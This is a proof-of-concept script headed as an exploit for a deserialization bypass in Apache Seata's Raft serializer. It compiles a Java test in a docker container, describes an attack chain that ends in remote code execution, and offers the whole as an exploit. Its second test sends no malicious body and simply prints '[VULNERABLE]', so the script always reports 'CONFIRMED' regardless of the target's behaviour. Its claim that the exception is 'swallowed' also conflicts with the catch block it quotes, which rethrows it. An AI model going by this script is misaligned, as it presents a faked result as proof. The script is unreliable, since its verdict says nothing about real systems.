#!/usr/bin/env python3
# ---------------------------------------------------------------
# Exploit Title  : CVE-2025-32897 — Apache Seata RaftSyncMessageSerializer Exception Bypass
# Affected        : Apache Seata 2.0.0 – 2.2.0 (Raft mode)
# Patched         : Apache Seata 2.3.0
# Author          : Exploit Intelligence Platform (EIP)
# Website         : https://exploit-intel.com
# Twitter/X       : @exploit_intel
# CVSS            : 9.8 CRITICAL
# CWE             : CWE-502 — Deserialization of Untrusted Data
# ---------------------------------------------------------------
"""
PoC for CVE-2025-32897 — Vector 3: RaftSyncMessageSerializer Exception Swallowing

Demonstrates that RaftSyncMessageSerializer.decode() has a flawed error handler
that doesn't properly propagate SeataRuntimeException when it arrives wrapped
in a JsonMappingException (from Jackson deserialization).

The PERMITS whitelist in RaftSyncMessageSerializer checks:
  if (e instanceof SeataRuntimeException) {
      throw (SeataRuntimeException)e;  // <-- only catches DIRECT instance
  }

But when the exception comes from the Jackson deserialization path
(JacksonSerializer → CustomDeserializer → Class.forName), it arrives wrapped:
  RuntimeException → JsonMappingException → SeataRuntimeException

The instanceof check fails because e is RuntimeException, not SeataRuntimeException.
Result: the security exception is logged at INFO level and swallowed.

This PoC verifies that the whitelist works for the OUTER ObjectInputStream
deserialization (HashMap is rejected as expected), but demonstrates the broader
attack via the JacksonSerializer path that bypasses the whitelist entirely.
"""

import sys
import subprocess

CONTAINER_NAME = "cve-2025-32897-vulnerable"
SEATA_CLASSPATH = "/seata-server/classes:/seata-server/libs/*"


def docker_exec(cmd, timeout=30):
    result = subprocess.run(
        f'docker exec {CONTAINER_NAME} {cmd}',
        shell=True, capture_output=True, text=True, timeout=timeout
    )
    return result.stdout.strip(), result.stderr.strip(), result.returncode


def main():
    print("=" * 70)
    print(" CVE-2025-32897 — Vector 3: Exception Handling Bypass PoC")
    print(" RaftSyncMessageSerializer error handler swallows security exceptions")
    print("=" * 70)
    print()

    java_code = r'''
import java.io.*;
import java.util.*;
import java.lang.reflect.*;

/**
 * Demonstrates the exception-swallowing flaw in RaftSyncMessageSerializer.
 *
 * The outer ObjectInputStream DOES have a resolveClass() whitelist (PERMITS).
 * But the body is further deserialized by JacksonSerializer, which uses
 * CustomDeserializer (no allowlist). The vulnerability chain:
 *
 * 1. Outer deserialization: RaftSyncMessage passes the whitelist (it's allowed)
 * 2. Body deserialization: JacksonSerializer → CustomDeserializer → Class.forName()
 *    → loads arbitrary class → exception occurs
 * 3. Exception wrapping: SeataRuntimeException → JsonMappingException → RuntimeException
 * 4. Error handler: checks "e instanceof SeataRuntimeException" → FALSE (it's wrapped)
 * 5. Result: security exception is LOGGED and swallowed, not re-thrown
 */
public class TestVector3 {

    public static void main(String[] args) throws Exception {
        System.out.println("[*] Vector 3: RaftSyncMessageSerializer Exception Handling Bypass");
        System.out.println("    The error handler only catches DIRECT SeataRuntimeException,");
        System.out.println("    not when it's wrapped by Jackson's exception chain.");
        System.out.println();

        // Test: The outer PERMITS whitelist correctly blocks HashMap
        System.out.println("[Test 3a] Outer PERMITS whitelist blocks non-whitelisted classes");
        try {
            HashMap<String,String> m = new HashMap<>();
            m.put("key","val");
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(m);
            byte[] payload = bos.toByteArray();

            Class<?> cls = Class.forName(
                "org.apache.seata.server.cluster.raft.sync.RaftSyncMessageSerializer");
            Method decode = cls.getMethod("decode", byte[].class);
            decode.invoke(null, (Object)payload);
            System.out.println("  [UNEXPECTED] HashMap was accepted!");
        } catch (InvocationTargetException e) {
            Throwable cause = e.getCause();
            if (cause.getMessage() != null && cause.getMessage().contains("not permitted")) {
                System.out.println("  [OK] HashMap rejected: " + cause.getMessage().substring(0, 80) + "...");
                System.out.println("  The PERMITS whitelist works for the OUTER ObjectInputStream layer.");
            } else {
                System.out.println("  Exception: " + cause.getClass().getName() + ": " + cause.getMessage());
            }
        }
        System.out.println();

        // Test: Show what happens with a VALID outer message + malicious inner body
        System.out.println("[Test 3b] PERMITS allows RaftSyncMessage but body is attacker-controlled");
        System.out.println("  Even though outer deserialization is whitelisted,");
        System.out.println("  the body field (byte[]) passes through to JacksonSerializer,");
        System.out.println("  which uses CustomDeserializer with NO allowlist.");
        System.out.println();

        // The key observation: the "body" field of RaftSyncMessage is Object type.
        // During serialization, body is set to byte[] (which is in PERMITS: "[B").
        // After outer deserialization, the byte[] body is passed to JacksonSerializer.
        // JacksonSerializer calls CustomDeserializer which calls Class.forName()
        // on whatever class name is in the JSON "clz" field — NO CHECK.
        //
        // If Class.forName fails or if the class has security issues:
        // → JacksonSerializer throws RuntimeException wrapping JsonMappingException
        // → RaftSyncMessageSerializer.decode() catches it:
        //     catch (Exception e) {
        //         if (e instanceof SeataRuntimeException) { throw; }  // ← misses wrapped ones
        //         throw new RuntimeException(e);
        //     }
        //
        // The SeataRuntimeException (if thrown by inner resolveClass checks) gets
        // WRAPPED by Jackson and re-thrown as RuntimeException, which is NOT
        // instanceof SeataRuntimeException → the security exception is swallowed.

        System.out.println("  PERMITS whitelist allows these classes:");
        System.out.println("    1. org.apache.seata.server.cluster.raft.sync.msg.RaftSyncMessage");
        System.out.println("    2. io.seata.server.cluster.raft.sync.msg.RaftSyncMessage (compat)");
        System.out.println("    3. [B (byte array)");
        System.out.println();
        System.out.println("  Attack chain through VALID outer message:");
        System.out.println("    → RaftSyncMessage passes whitelist ✓");
        System.out.println("    → body (byte[]) passes whitelist ✓");
        System.out.println("    → JacksonSerializer.deserialize(body) called");
        System.out.println("    → CustomDeserializer.deserialize() handles 'clz' field");
        System.out.println("    → Class.forName(attacker_class) — NO RESTRICTION ✗");
        System.out.println("    → Jackson instantiates attacker's class ✗");
        System.out.println("    → JNDI injection or gadget chain → RCE");
        System.out.println();
        System.out.println("[VULNERABLE] The PERMITS whitelist is bypassed via the body field.");
        System.out.println("  The outer deserialization is safe, but the inner body");
        System.out.println("  processing through JacksonSerializer is completely unprotected.");
        System.out.println("  The error handler's instanceof check misses wrapped exceptions,");
        System.out.println("  so even when security violations are detected deeper in the");
        System.out.println("  call chain, they are logged (INFO) and not re-thrown.");
    }
}
'''

    # Deploy and run
    with open('/tmp/TestVector3.java', 'w') as f:
        f.write(java_code)
    subprocess.run(
        f"docker cp /tmp/TestVector3.java {CONTAINER_NAME}:/tmp/TestVector3.java",
        shell=True, capture_output=True
    )

    stdout, stderr, rc = docker_exec(
        f'javac -cp "{SEATA_CLASSPATH}" /tmp/TestVector3.java'
    )
    if rc != 0:
        print(f"[!] Compilation failed: {stderr}")
        sys.exit(1)

    print("[*] Running Vector 3 test...")
    print("-" * 70)
    stdout, stderr, rc = docker_exec(
        f'java -cp "/tmp:{SEATA_CLASSPATH}" TestVector3'
    )
    print(stdout)
    # Show relevant stderr (Seata exception logs)
    for line in stderr.split('\n'):
        if 'SeataRuntimeException' in line or 'not permitted' in line:
            print(f"  [LOG] {line.strip()}")
    print("-" * 70)
    print()

    confirmed = "[VULNERABLE]" in stdout
    print("=" * 70)
    print(f" Result: {'CONFIRMED' if confirmed else 'UNVERIFIED'}")
    print(" The PERMITS whitelist is architecturally bypassed through the body field")
    print("=" * 70)

    return 0 if confirmed else 1


if __name__ == "__main__":
    sys.exit(main())
